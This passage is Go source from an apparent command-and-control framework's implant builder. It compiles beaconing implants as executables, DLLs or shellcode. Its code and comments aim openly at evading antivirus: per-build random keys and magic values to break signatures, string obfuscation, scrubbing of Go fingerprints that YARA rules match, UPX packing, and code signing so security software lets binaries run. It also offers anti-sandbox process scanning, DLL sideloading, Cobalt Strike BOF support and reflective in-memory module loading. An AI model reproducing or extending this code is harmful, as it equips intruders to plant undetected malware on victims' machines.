package builder

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/fs"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	donut "github.com/Binject/go-donut/donut"
	"toshell/internal/common/features"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
)

type Builder struct {
	config     *config.ImplantConfig
	implantDir string
	useGarble  bool
	useUPX     bool
	upxPath    string
}

type BuildOptions struct {
	Name         string
	Format       string
	Language     string // 植入端语言：go（默认）/ c（C 植入端，体积极小）
	ListenerID   string
	ServerURL    string
	Protocol     string
	Interval     uint32
	Jitter       uint32
	RetryCount   uint32
	RetryWait    uint32
	KillDate     string
	WorkingHours string
	RelayListen  string // 中继监听地址（非空启用中继角色，Beacon Mesh）
	FrontDomain  string // 域前置拟态域名：HTTPS 轮询通道的 TLS SNI + HTTP Host
	Transport    string // 通道类型：tcp / http（按 Protocol 推导；http 构建才包含轮询通道代码）
	Profile      string // 构建档案：full(默认,全功能) / light(精简,裁剪重量级模块减体积)
	Modules      []string
	OS           string
	Arch         string
	// Evasion options
	XOREncrypt   bool `json:"xor_encrypt"`
	XORKeySize   int  `json:"xor_key_size"`
	GarbleEnable bool `json:"garble_enabled"`
	UPXEnable    bool `json:"upx_enabled"`
	// 每构建随机的配置块魔数与 XOR 密钥（内部生成，打破跨样本同指纹；三端一致）
	CfgMagic string  `json:"-"`
	CfgKey   [4]byte `json:"-"`
	XfBase   byte    `json:"-"` // xd 线性密钥基准（替换固定 0x5A）
	// apihash FNV 种子/乘子（P1-4 随机化，使 API 哈希跨样本不同）
	ApiHashSeed uint32 `json:"-"`
	ApiHashMul  uint32 `json:"-"`
	// 启动随机延迟（秒）：植入端启动后随机休眠 [min,max] 秒，打乱"启动即行为"的检测节奏。
	StartDelayMin int `json:"startup_delay_min"`
	StartDelayMax int `json:"startup_delay_max"`
	// 主动反沙箱进程检测（枚举进程并与安全软件/分析工具进程名比对后延迟执行）。
	// **默认关闭**：该行为是国产杀软主动防御明确拦截的对抗动作，且需要静态导入
	// toolhelp32 API + 携带安全软件进程名字符串。开启时服务端加 -tags evasionscan，
	// 只有勾选才把 gate_scan_windows.go 编进载荷。
	EvasionScan bool `json:"evasion_scan"`
	// 构建后代码签名（Authenticode）：请求只能开启，证书配置在服务端 builder.sign_*。
	SignEnabled bool `json:"sign_enabled"`
	// BOF 支持（Cobalt Strike Beacon Object File）：**默认关闭**，开启时加 -tags bof。
	// 关闭时载荷里不含任何 Beacon* 符号/字符串（实测这是 full 档案里唯一剩下的
	// 高信号明文），需要用 BOF 时再开。
	BofEnabled bool `json:"bof_enabled"`
	// 内存模块按需加载（v1.4.0 S4）：**默认关闭**，开启时加 -tags execmodule。
	//
	// 关闭时载荷里没有 exec_module 任务处理、没有模块 ABI 结构、也没有 sha256 校验 ——
	// 默认构建与改动前逐字节行为一致。开启后服务端可以用一次性 token 按需把模块
	// 下发给载荷，在内存里反射加载执行（不落盘、不重建载荷即可获得新功能）。
	ExecModule bool `json:"exec_module"`
	// DLL 载荷（format=dll）：导出函数名（供 rundll32 调用，空 = Start）与"加载即启动"。
	// 白加黑场景宿主不一定调用我们的导出函数，所以默认加载即启动（见 dll.go）。
	DLLExport    string `json:"dll_export"`
	DLLAutoStart bool   `json:"dll_autostart"`
}

type BuildResult struct {
	Binary          []byte
	Config          []byte
	Shellcode       []byte
	ShellcodeHex    string
	ShellcodeBase64 string
	SHA256          string
	Format          string
	BuildTime       time.Time
	// Evasion metadata
	XORKey []byte `json:"xor_key,omitempty"`
	HasXOR bool   `json:"has_xor"`
	// Sign 代码签名结果（启用签名时才非空）
	Sign *SignResult `json:"sign,omitempty"`
}

func New() *Builder {
	cfg := config.Get()
	return newBuilder(&cfg.Implant)
}

func NewWithConfig(cfg *config.Config) *Builder {
	if cfg == nil {
		cfg = config.Get()
	}
	return newBuilder(&cfg.Implant)
}

func newBuilder(implantCfg *config.ImplantConfig) *Builder {
	// garble 只做 LookPath 快速判定；是否**真的能编译**由 GarbleStatus 用一次
	// 极小真实构建探测（garble 大版本对 Go 版本有硬要求，版本不符时
	// `garble version` 正常但任何 `garble build` 立即失败）。
	garbleAvailable := false
	if _, err := exec.LookPath("garble"); err == nil {
		garbleAvailable = true
		logging.Info("builder", "garble detected, checking toolchain compatibility in background")
	} else {
		logging.Info("builder", "garble not found, obfuscation disabled (install: go install mvdan.cc/garble@latest)")
	}

	upxPath := resolveUPXPath()
	upxAvailable := upxPath != ""
	if upxAvailable {
		logging.Info("builder", "UPX detected (%s), compression available", upxPath)
	} else {
		logging.Info("builder", "UPX not found, compression disabled (bundled: upx/win64/upx.exe or upx/linux-amd64/upx next to server binary, or install: https://upx.github.io)")
	}

	b := &Builder{
		config:     implantCfg,
		implantDir: resolveImplantTemplateDir(implantCfg),
		useGarble:  garbleAvailable,
		useUPX:     upxAvailable,
		upxPath:    upxPath,
	}
	// 后台预热 garble 兼容性探测，避免用户首次打开生成载荷页时同步等待。
	if garbleAvailable {
		go func() {
			ok, msg := b.GarbleStatus()
			if !ok {
				logging.Warn("builder", "garble 不可用，已停用混淆选项：%s", msg)
			}
		}()
	}
	return b
}

// resolveUPXPath 解析 UPX 可执行文件路径，按以下顺序回退：
//  1. 可执行文件同目录的 upx/<平台目录>/upx(.exe)（如 upx/win64/upx.exe、upx/linux-amd64/upx）
//  2. 可执行文件同目录的 upx/<平台目录>/upx-*/upx(.exe)（兼容带版本号的子目录）
//  3. 系统 PATH 中的 upx
//
// 返回空串表示未找到。
func resolveUPXPath() string {
	binName := "upx"
	if runtime.GOOS == "windows" {
		binName = "upx.exe"
	}

	// 平台目录仅按 GOOS 判断：服务端可能是 386 等架构编译，但运行环境是
	// 64 位系统时应使用对应平台的 UPX（win64/linux-amd64），与自身架构无关。
	platformDir := ""
	switch runtime.GOOS {
	case "windows":
		platformDir = "win64"
	case "linux":
		platformDir = "linux-amd64"
	}

	if platformDir != "" {
		if exePath, err := os.Executable(); err == nil {
			baseDir := filepath.Join(filepath.Dir(exePath), "upx", platformDir)
			logging.Debug("builder", "resolveUPXPath: exe=%s baseDir=%s bin=%s", exePath, baseDir, binName)
			if p := findUPXBinary(baseDir, binName); p != "" {
				return p
			}
		}
	}

	if p, err := exec.LookPath(binName); err == nil {
		return p
	}
	return ""
}

// findUPXBinary 在目录 baseDir 中查找 upx 二进制，优先 baseDir/upx，其次 baseDir/upx-* 子目录。
func findUPXBinary(baseDir, binName string) string {
	direct := filepath.Join(baseDir, binName)
	if info, err := os.Stat(direct); err == nil && !info.IsDir() {
		return direct
	}
	if entries, err := os.ReadDir(baseDir); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			cand := filepath.Join(baseDir, e.Name(), binName)
			if info, err := os.Stat(cand); err == nil && !info.IsDir() {
				return cand
			}
		}
	}
	return ""
}

// resolveImplantTemplateDir 解析植入端模板源码目录，按以下顺序回退：
//  1. 配置项 implant.template_dir
//  2. 环境变量 TOSHELL_IMPLANT_TEMPLATE_DIR
//  3. 可执行文件同目录的 implant/
//  4. 可执行文件同目录的 internal/server/builder/implant
//  5. 当前工作目录的 internal/server/builder/implant
//
// 均无效时返回默认相对路径，便于后续构建时报出清晰错误。
func resolveImplantTemplateDir(implantCfg *config.ImplantConfig) string {
	candidates := []string{}
	if implantCfg != nil && implantCfg.TemplateDir != "" {
		candidates = append(candidates, implantCfg.TemplateDir)
	}
	if env := os.Getenv("TOSHELL_IMPLANT_TEMPLATE_DIR"); env != "" {
		candidates = append(candidates, env)
	}

	if exePath, err := os.Executable(); err == nil {
		exeDir := filepath.Dir(exePath)
		candidates = append(candidates,
			filepath.Join(exeDir, "implant"),
			filepath.Join(exeDir, "internal", "server", "builder", "implant"),
		)
	}
	if wd, err := os.Getwd(); err == nil {
		candidates = append(candidates,
			filepath.Join(wd, "internal", "server", "builder", "implant"),
		)
	}

	for _, dir := range candidates {
		if dir == "" {
			continue
		}
		if info, err := os.Stat(dir); err == nil && info.IsDir() {
			// 要求目录内存在 main.go 模板，避免误命中空目录。
			if _, err := os.Stat(filepath.Join(dir, "main.go")); err == nil {
				logging.Info("builder", "using implant template dir: %s", dir)
				return dir
			}
		}
	}

	logging.Warn("builder", "implant template dir not found, falling back to default; configure implant.template_dir or TOSHELL_IMPLANT_TEMPLATE_DIR")
	return "internal/server/builder/implant"
}

const configBlockMagic = "TOSHELL_CFG_V1:"

// configBlockKey 配置块加密使用的循环密钥（位置无关）。
// 与服务端配置块写入 / 植入端解析保持完全一致。
var configBlockKey = [4]byte{0x5A, 0xC3, 0x2D, 0x9F}

// configBlockMagicEnc 是加密后的配置块标识（常量序列），
// 用于在二进制尾部定位配置块，无需解密整个文件。
var configBlockMagicEnc = xorBlockKey([]byte(configBlockMagic), configBlockKey[:])

// xorBlockKey 用循环密钥逐字节加密/解密（位置无关，长度不变）。
func xorBlockKey(b, key []byte) []byte {
	out := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		out[i] = b[i] ^ key[i%len(key)]
	}
	return out
}

// randomCfgMagic 生成一个随机短魔数字符串（仅 [a-zA-Z0-9]，避免干扰混淆/占位符）。
func randomCfgMagic() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	buf := make([]byte, 12)
	for i := range buf {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		buf[i] = chars[n.Int64()]
	}
	return "cfg-" + string(buf) + ":"
}

// randomCfgKey 生成随机 4 字节 XOR 密钥（配置块加密用，替换固定 0x5A,0xC3,0x2D,0x9F）。
func randomCfgKey() [4]byte {
	var k [4]byte
	rand.Read(k[:])
	return k
}

// randomXfBase 生成随机 xd 线性密钥基准（替换固定 0x5A），每次构建不同，字符串密文随之变化。
func randomXfBase() byte {
	b := make([]byte, 1)
	rand.Read(b)
	return 0x21 + b[0]%0x80 // 避免与 0x5A 常有重叠；取 0x21..0xA0
}

// randomUint32 生成 < max 的随机 uint32（crypto/rand）。
func randomUint32(max int64) uint32 {
	n, _ := rand.Int(rand.Reader, big.NewInt(max))
	return uint32(n.Int64())
}

func (b *Builder) Build(opts BuildOptions) (*BuildResult, error) {
	// P0-1: 每构建生成随机配置块魔数 + XOR 密钥 + xd 密钥基准（三端一致），
	// 使不同样本的配置块/字符串加密字节不再相同，打破跨样本同指纹。
	opts.CfgMagic = randomCfgMagic()
	opts.CfgKey = randomCfgKey()
	opts.XfBase = randomXfBase()
	opts.ApiHashSeed = randomUint32(0x7FFFFFFF) | 1 // 奇数种子，且非 0
	opts.ApiHashMul = randomUint32(0x7FFFFFFF) | 1  // 奇数乘子（FNV 通常用奇数）

	// 启动随机延迟默认值：优先取设置页「植入端」配置（implant.startup_delay_min/max），未配则回退 2~10 秒随机
	if cfg := config.Get(); cfg != nil {
		if opts.StartDelayMin <= 0 {
			opts.StartDelayMin = cfg.Implant.StartupDelayMin
		}
		if opts.StartDelayMax <= 0 {
			opts.StartDelayMax = cfg.Implant.StartupDelayMax
		}
	}
	if opts.StartDelayMax < opts.StartDelayMin {
		opts.StartDelayMax = opts.StartDelayMin
	}
	if opts.StartDelayMax <= 0 {
		opts.StartDelayMin = 2
		opts.StartDelayMax = 10
	}
	if opts.StartDelayMin <= 0 {
		opts.StartDelayMin = 2
	}

	targetOS := opts.OS
	if targetOS == "" {
		targetOS = "windows"
	}

	// 交付流水线的"字节加工顺序"契约（签名必须最后，见 finalize_order.go）：
	// 构建开始时打一行日志并在顺序被改坏时告警 —— 白签从接口上看仍是 signed=true，
	// 只能在这里留痕。
	b.logFinalizePipeline(opts, targetOS)

	// C 植入端：独立编译管线（当前支持 Windows exe，x86/x64）
	if opts.Language == "c" {
		if targetOS != "windows" {
			return nil, fmt.Errorf("C implant currently supports windows only")
		}
		result, err := b.buildCExecutable(opts)
		if err != nil {
			return nil, err
		}
		result.Format = opts.Format
		result.BuildTime = time.Now()
		// C 植入端同样是 Windows PE：走同一套可选代码签名（未签名的新 PE 在国产
		// 安全软件主机上会被拒绝执行，见 sign.go 顶部说明）。
		if len(result.Binary) > 0 {
			if signed, signRes, serr := b.signIfNeeded(result.Binary, opts.Format, opts.SignEnabled); serr != nil {
				return nil, serr
			} else if signRes != nil {
				result.Binary = signed
				result.Sign = signRes
				if signRes.Signed {
					logging.Info("builder", "C 植入端代码签名成功（%s）%s", signRes.Method, signerSuffix(signRes.Signer))
				} else {
					logging.Warn("builder", "C 植入端产物未签名：%s", signRes.Message)
				}
			}
		}
		if len(result.Binary) > 0 {
			hash := sha256.Sum256(result.Binary)
			result.SHA256 = hex.EncodeToString(hash[:])
		}
		return result, nil
	}

	var result *BuildResult
	var err error

	switch opts.Format {
	case "exe", "bin":
		result, err = b.buildExecutable(opts)
	case "dll", "so":
		result, err = b.buildLibrary(opts)
	case "shellcode":
		result, err = b.buildShellcode(opts)
	case "shellcode_bin":
		result, err = b.buildShellcodeBin(opts)
	case "raw":
		result, err = b.buildRaw(opts)
	default:
		return nil, fmt.Errorf("unsupported format: %s", opts.Format)
	}

	if err != nil {
		return nil, err
	}

	result.Format = opts.Format
	result.BuildTime = time.Now()

	// 代码签名（Windows PE，可选）：在算 sha256 / 落盘之前签名，保证接口返回的
	// size 与 sha256 就是"交付字节"的值（签名会改变文件内容与长度）。
	if len(result.Binary) > 0 {
		if signed, signRes, serr := b.signIfNeeded(result.Binary, opts.Format, opts.SignEnabled); serr != nil {
			return nil, serr
		} else if signRes != nil {
			result.Binary = signed
			result.Sign = signRes
			if signRes.Signed {
				logging.Info("builder", "代码签名成功（%s）%s", signRes.Method, signerSuffix(signRes.Signer))
			} else {
				logging.Warn("builder", "产物未签名：%s", signRes.Message)
			}
		}
	}

	if len(result.Binary) > 0 {
		hash := sha256.Sum256(result.Binary)
		result.SHA256 = hex.EncodeToString(hash[:])

		outputDir := b.config.OutputDir
		if outputDir == "" {
			outputDir = "./implants"
		}

		if err := os.MkdirAll(outputDir, 0755); err != nil {
			logging.Warn("builder", "Failed to create output directory: %v", err)
		} else {
			filename := b.GetOutputFilename(opts)
			outputPath := filepath.Join(outputDir, filename)

			var saveData []byte
			if opts.Format == "shellcode" {
				saveData = []byte(result.ShellcodeHex)
			} else {
				saveData = result.Binary
			}

			if err := os.WriteFile(outputPath, saveData, 0755); err != nil {
				logging.Warn("builder", "Failed to save implant: %v", err)
			} else {
				logging.Info("builder", "Implant saved to: %s", outputPath)
			}
		}
	}

	return result, nil
}

// GetOutputFilename returns the file name (without directory) that Builder.Build
// writes to disk for the given options. Callers use it to clean up the redundant
// copy so a single build never leaves two files behind.
func (b *Builder) GetOutputFilename(opts BuildOptions) string {
	filename := opts.Name
	if filename == "" {
		filename = fmt.Sprintf("implant-%d", time.Now().Unix())
	}

	ext := ""
	switch opts.Format {
	case "exe":
		ext = ".exe"
	case "dll":
		ext = ".dll"
	case "bin":
		if opts.OS == "windows" {
			ext = ".exe"
		}
	case "so":
		ext = ".so"
	case "shellcode":
		ext = ".txt"
	case "shellcode_bin":
		ext = ".bin"
	}

	if ext != "" && !strings.HasSuffix(filename, ext) {
		filename = filename + ext
	}

	return filename
}

func (b *Builder) buildExecutable(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compile(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile: %v", err)
	}

	configData, _ := json.Marshal(b.buildConfig(opts))

	// Append config block to the binary so implant can read it at runtime
	cfg := config.Get()
	encKeyB64 := base64.StdEncoding.EncodeToString([]byte(cfg.Listener.EncryptionKey))
	serverURL := opts.ServerURL
	if serverURL == "" {
		serverURL = opts.Protocol + "://" + cfg.Listener.Host + ":" + fmt.Sprintf("%d", cfg.Listener.Port)
	}
	binary = appendConfigBlock(binary, serverURL, encKeyB64, &opts)

	return &BuildResult{
		Binary:    binary,
		Config:    configData,
		Shellcode: binary,
	}, nil
}

func (b *Builder) buildLibrary(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compileLibrary(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile library: %v", err)
	}

	configData, _ := json.Marshal(b.buildConfig(opts))

	return &BuildResult{
		Binary:    binary,
		Config:    configData,
		Shellcode: binary,
	}, nil
}

func (b *Builder) buildRaw(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compile(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile: %v", err)
	}

	configData, _ := json.Marshal(b.buildConfig(opts))

	return &BuildResult{
		Binary:    binary,
		Config:    configData,
		Shellcode: binary,
	}, nil
}

func (b *Builder) compile(opts BuildOptions) ([]byte, error) {
	targetOS := opts.OS
	arch := opts.Arch
	if targetOS == "" {
		targetOS = "windows"
	}
	if arch == "" {
		arch = "amd64"
	}

	tmpDir, err := os.MkdirTemp("", "toshell-build-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	if err := b.copyImplantSource(tmpDir, targetOS); err != nil {
		return nil, fmt.Errorf("failed to copy implant source: %v", err)
	}

	if err := b.processTemplates(tmpDir, opts); err != nil {
		return nil, fmt.Errorf("failed to process templates: %v", err)
	}

	// Use garble if enabled and available
	useGarble := b.useGarble && opts.GarbleEnable

	// 通道类型：显式指定优先，否则按协议推导（http/https → http，其余 → tcp）
	transport := opts.Transport
	if transport == "" {
		transport = transportForProtocol(opts.Protocol)
	}

	// P0-1/P1-3: 先注入每构建随机的配置块魔数/密钥 + xd 密钥基准，
	// 再执行字符串混淆（用同一随机 xd 基准），最后编译（走 Go 植入端）。
	b.injectBuildConstants(tmpDir, &opts)
	if err := b.obfuscateImplantSources(tmpDir, opts.XfBase); err != nil {
		return nil, fmt.Errorf("failed to obfuscate implant source: %v", err)
	}

	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile, opts.EvasionScan, opts.BofEnabled, opts.ExecModule)
	if err != nil {
		return nil, err
	}

	// Go 指纹擦除（构建期特征，运行时不需要）：在 UPX 之前做，只做原地置零、长度不变，
	// 因此 PE 节表/RVA/重定位/UPX 输入布局全部不受影响。擦除对象：
	//   `\xff Go buildinf:` 魔数、buildinfo 窗口内的 Go 版本串、`Go build ID:` 前缀。
	// 这些只被 debug.ReadBuildInfo / go tool buildid 读取，运行时（调度器/GC/栈回溯）不用，
	// 但它们是 Go 家族 YARA 规则最稳定的命中点。
	if scrubbed, removed := ScrubGoFingerprint(binary); len(removed) > 0 {
		binary = scrubbed
		logging.Info("builder", "go fingerprint scrubbed: %s", strings.Join(removed, "；"))
	}
	// 第二遍：全文件版本串（`runtime.buildVersion`，锚定窗口扫不到的那一份）。必须在 UPX 之前。
	if scrubbed, removed := ScrubGoVersionStrings(binary); len(removed) > 0 {
		binary = scrubbed
		logging.Info("builder", "go version string scrubbed: %s", strings.Join(removed, "；"))
	}

	// UPX 压缩（仅 Windows exe 且 UPX 可用且开启）
	if b.useUPX && opts.UPXEnable && targetOS == "windows" && (opts.Format == "exe" || opts.Format == "bin") {
		compressed, err := b.compressWithUPX(binary)
		if err != nil {
			logging.Warn("builder", "UPX compression failed, using uncompressed: %v", err)
		} else {
			logging.Info("builder", "UPX compression: %d -> %d bytes (%.1f%%)",
				len(binary), len(compressed), float64(len(compressed))/float64(len(binary))*100)
			binary = compressed
		}
	}

	return binary, nil
}

func (b *Builder) compileLibrary(opts BuildOptions) ([]byte, error) {
	targetOS := opts.OS
	arch := opts.Arch
	if targetOS == "" {
		targetOS = "windows"
	}
	if arch == "" {
		arch = "amd64"
	}

	tmpDir, err := os.MkdirTemp("", "toshell-build-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	if err := b.copyImplantSource(tmpDir, targetOS); err != nil {
		return nil, fmt.Errorf("failed to copy implant source: %v", err)
	}

	if err := b.processTemplates(tmpDir, opts); err != nil {
		return nil, fmt.Errorf("failed to process templates: %v", err)
	}

	// 真正的 DLL（c-shared + mingw），见 dll.go：
	// v1.3.5 及以前这里是普通 go build（CGO_ENABLED=0），`import "C"` 的胶水会被 Go
	// 静默跳过，产物其实是"改了扩展名的 EXE"（无 IMAGE_FILE_DLL、无导出表），
	// 白加黑/rundll32 加载器链根本用不了。
	exportName, err := ValidateDLLExport(opts.DLLExport)
	if err != nil {
		return nil, err
	}
	// DLL 路径此前**漏了 exe 路径的两道静态降特征工序**（v1.4.0 S3 补齐）：
	//   ① injectBuildConstants：每构建随机的配置块魔数/密钥 + xd 密钥基准；
	//   ② obfuscateImplantSources：模板字符串混淆（C2 地址、注册表键、ETW/API 名…）。
	// 实测同一份模板：DLL 未做混淆时明文高信号 API 名 11 处、`http://` 2 处、ETW 4 处、
	// 持久化注册表键 3 处，而 exe 路径（做了混淆）只剩标准库自带的那 1 处 —— 白加黑链
	// 交付的恰恰是 DLL，等于把最该藏的东西明文交出去。顺序与 compile() 一致：
	// 先注入（影响后续混淆的明文），再混淆，最后编译。
	b.injectBuildConstants(tmpDir, &opts)
	if err := b.obfuscateImplantSources(tmpDir, opts.XfBase); err != nil {
		return nil, fmt.Errorf("failed to obfuscate implant source: %v", err)
	}
	bin, err := b.compileSharedLibrary(tmpDir, targetOS, arch, opts, exportName, opts.DLLAutoStart)
	if err != nil {
		return nil, err
	}
	// 指纹擦除的"版本串"这一遍（锚定版由 dll.go 的 compileSharedLibrary 负责）：实测
	// c-shared 产物里 `go1.20.14`（runtime.buildVersion）落在锚定窗口之外，必须全文件扫一遍。
	// 等长置零不影响 PE 节表/重定位，也不影响其后的签名（签名在 Build 里，永远是最后一步）。
	if scrubbed, removed := ScrubGoVersionStrings(bin); len(removed) > 0 {
		bin = scrubbed
		logging.Info("builder", "DLL go version string scrubbed: %s", strings.Join(removed, "；"))
	}
	return bin, nil
}

// 说明：旧的 generateLibraryCode（生成 `//export DllMain {}` + 空 main 的假 DLL 胶水）
// 已删除 —— 它在 CGO_ENABLED=0 下会被 Go 静默跳过，让 `format=dll` 产出"改了扩展名的 EXE"。
// 现在 DLL 由 dll.go 的 generateDLLGlue 生成（c-shared + 加载即启动 + 可配置导出名）。

func (b *Builder) copyImplantSource(tmpDir, targetOS string) error {
	return filepath.WalkDir(b.implantDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		if d.IsDir() {
			return nil
		}

		relPath, err := filepath.Rel(b.implantDir, path)
		if err != nil {
			return err
		}

		filename := d.Name()

		data, err := os.ReadFile(path)
		if err != nil {
			return err
		}

		content := string(data)

		if strings.HasPrefix(filename, "platform_") {
			isWindows := strings.Contains(filename, "windows")
			if (targetOS == "windows" && !isWindows) || (targetOS != "windows" && isWindows) {
				return nil
			}
			content = strings.Replace(content, "//go:build windows\n\n", "", 1)
			content = strings.Replace(content, "//go:build !windows\n\n", "", 1)
			content = strings.Replace(content, "//go:build windows", "", 1)
			content = strings.Replace(content, "//go:build !windows", "", 1)
			relPath = "platform.go"
		}

		destPath := filepath.Join(tmpDir, relPath)

		if err := os.MkdirAll(filepath.Dir(destPath), 0755); err != nil {
			return err
		}

		return os.WriteFile(destPath, []byte(content), 0644)
	})
}

func (b *Builder) processTemplates(tmpDir string, opts BuildOptions) error {
	cfg := config.Get()
	key := []byte(cfg.Listener.EncryptionKey)

	// 把真正烘焙进载荷的参数写进日志：出现"配了没生效/载荷里怎么有这个特征"时，
	// 这行是唯一可信的第一现场（前端请求与服务端配置三层，任一层都可能覆盖）。
	logging.Info("builder",
		"rendering implant: url=%s interval=%ds jitter=%d%% startup_delay=%d~%ds evasion_scan=%v profile=%s",
		opts.ServerURL, opts.Interval, opts.Jitter, opts.StartDelayMin, opts.StartDelayMax,
		opts.EvasionScan, opts.Profile)

	mainFile := filepath.Join(tmpDir, "main.go")
	data, err := os.ReadFile(mainFile)
	if err != nil {
		return err
	}

	content := string(data)

	// 安全加固：{{SERVER_URL}} 位于 Go 字符串字面量内（serverAddr = "{{SERVER_URL}}"），
	// 用 cQuote 转义引号/反斜杠，防 `"; 任意代码; //` 注入编译出的植入体。
	// （cQuote 的转义规则与 Go/C 字符串字面量兼容：\\ \" \n \r \t）
	content = strings.ReplaceAll(content, "{{SERVER_URL}}", cQuote(opts.ServerURL))
	content = strings.ReplaceAll(content, "{{INTERVAL}}", fmt.Sprintf("%d", opts.Interval))
	content = strings.ReplaceAll(content, "{{RETRY_WAIT}}", fmt.Sprintf("%d", opts.RetryWait))

	// 心跳抖动百分比（0-100，0=固定间隔）
	content = strings.ReplaceAll(content, "{{JITTER_LINE}}",
		fmt.Sprintf("jitterPct = %d", opts.Jitter))

	// 重连退避基础等待（秒）
	content = strings.ReplaceAll(content, "{{RETRY_WAIT_LINE}}",
		fmt.Sprintf("retryWaitSec = %d", opts.RetryWait))
	if opts.RetryWait <= 0 {
		content = strings.ReplaceAll(content, "{{RETRY_WAIT_LINE}}",
			"retryWaitSec = 5")
	}

	// KillDate（自杀日期，YYYY-MM-DD，空=不启用）
	content = strings.ReplaceAll(content, "{{KILL_DATE_LINE}}",
		fmt.Sprintf("killDateStr = %q", opts.KillDate))

	// WorkingHours（工作时段，HH:MM-HH:MM，空=不启用）
	content = strings.ReplaceAll(content, "{{WORKING_HOURS_LINE}}",
		fmt.Sprintf("applyWorkingHours(%q)", opts.WorkingHours))

	// RelayListen（中继监听地址，空=不启用中继角色）
	content = strings.ReplaceAll(content, "{{RELAY_LISTEN_LINE}}",
		fmt.Sprintf("relayListen = %q", opts.RelayListen))

	// 加密密钥作为备用，主要通过配置块传递
	if len(key) > 0 {
		content = strings.ReplaceAll(content, "{{ENCRYPTION_KEY}}", base64.StdEncoding.EncodeToString(key))
	} else {
		content = strings.ReplaceAll(content, "{{ENCRYPTION_KEY}}", "")
	}

	// 启动随机延迟（min~max 秒）：植入端启动后休眠随机时长，打乱"启动即行为"检测
	content = strings.ReplaceAll(content, "{{STARTUP_DELAY_MIN}}", fmt.Sprintf("%d", opts.StartDelayMin))
	content = strings.ReplaceAll(content, "{{STARTUP_DELAY_MAX}}", fmt.Sprintf("%d", opts.StartDelayMax))

	return os.WriteFile(mainFile, []byte(content), 0644)
}

// buildTagList 汇总植入端构建需要的 Go 构建标签（空格分隔，可直接给 -tags）。
// 单独抽成函数便于单测：标签直接决定哪些代码进入载荷（免杀相关，改错很难察觉）。
//
// v1.4.0 S4 追加 execmodule：**默认关闭**，只有显式勾选才把"按需内存加载模块"的
// 代码（exec_module_windows.go + 反射加载底座）编进载荷。默认构建因此与改动前
// 逐字节等价（标签集合不变 → 参与编译的文件集合不变）。
func buildTagList(transport, profile string, evasionScan, bof, execModule bool) string {
	var tags []string
	switch transport {
	case "http":
		tags = append(tags, "transport_http")
	case "websocket":
		tags = append(tags, "transport_ws")
	case "mqtt":
		tags = append(tags, "transport_mqtt")
	}
	// 档案收敛到唯一口径：未知档案（"nano"/拼错的名字）fail-closed 归入 light。
	// 必须与 features.Derive 用同一个 NormalizeProfile，否则会出现
	// "编了 full、界面按最小集显示"（或反过来）—— 正是 S4 要根除的分叉。
	if features.NormalizeProfile(profile) == features.ProfileLight {
		tags = append(tags, "light")
	}
	if evasionScan {
		tags = append(tags, "evasionscan")
	}
	if bof {
		tags = append(tags, "bof")
	}
	if execModule {
		// exec_module（v1.4.0 S4）：按需内存加载模块。
		// 用**独立 tag** 而不是"跟着 profile 走"的原因：默认载荷必须与改动前逐字节
		// 行为一致（体积也基本不变），而"能加载模块"是一个会引入反射加载器调用面的
		// 能力 —— 想拿到它必须显式勾选，顺手得到的默认行为里不该多出这条路径。
		tags = append(tags, "execmodule")
	}
	return strings.Join(tags, " ")
}

// capabilityInput 把构建选项映射成能力推导入参（features.Input）。
//
// 只挑"真的决定编译内容"的字段；OS/Arch 的空值按 compile() 的默认值收敛
// （windows/amd64），保证这里算出的位图与真正编译出的载荷一致。
func capabilityInput(opts *BuildOptions) features.Input {
	targetOS := opts.OS
	if targetOS == "" {
		targetOS = "windows"
	}
	arch := opts.Arch
	if arch == "" {
		arch = "amd64"
	}
	transport := opts.Transport
	if transport == "" {
		transport = transportForProtocol(opts.Protocol)
	}
	return features.Input{
		Profile:     opts.Profile,
		Transport:   transport,
		Protocol:    opts.Protocol,
		BOF:         opts.BofEnabled,
		EvasionScan: opts.EvasionScan,
		ExecModule:  opts.ExecModule,
		OS:          targetOS,
		Arch:        arch,
	}
}

func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string, evasionScan, bof, execModule bool) ([]byte, error) {
	// 编译期字符串混淆（免杀）改由 compile() 在注入每构建随机值之后统一调用，
	// 确保随机 xd 基准与注入值一致。
	// 条件编译标签（见 buildTagList）：
	//   transport=http       → transport_http（HTTPS 轮询通道，体积较大）
	//   transport=websocket  → transport_ws（WebSocket 通道）
	//   transport=mqtt       → transport_mqtt（MQTT pub/sub 通道）
	//   profile=light        → light（裁剪截图/中继/注入/EDR 等重量级模块）
	//   evasion_scan=on      → evasionscan（主动反沙箱进程检测；默认不编译，
	//                          见 implant/gate_scan_windows.go 的说明）
	buildTags := buildTagList(transport, profile, evasionScan, bof, execModule)

	// TLS 客户端实现文件按通道裁剪：
	//   - 非 HTTP 构建（TCP）：transport_tls_std.go / transport_tls_utls.go
	//     都带 transport_http 标签不参与编译，但 go mod tidy 解析 import 时
	//     仍会扫到 transport_tls_utls.go 的 utls 引用，把 utls/x/sys 升到
	//     需要更高 Go 版本的最新版（cannot compile Go 1.23 code）。
	//   - HTTP+light：只用标准库 TLS，删除 utls 实现。
	// 物理删除被排除文件，彻底避免 tidy 引入多余依赖。
	if transport != "http" {
		_ = os.Remove(filepath.Join(tmpDir, "transport_tls_std.go"))
		_ = os.Remove(filepath.Join(tmpDir, "transport_tls_utls.go"))
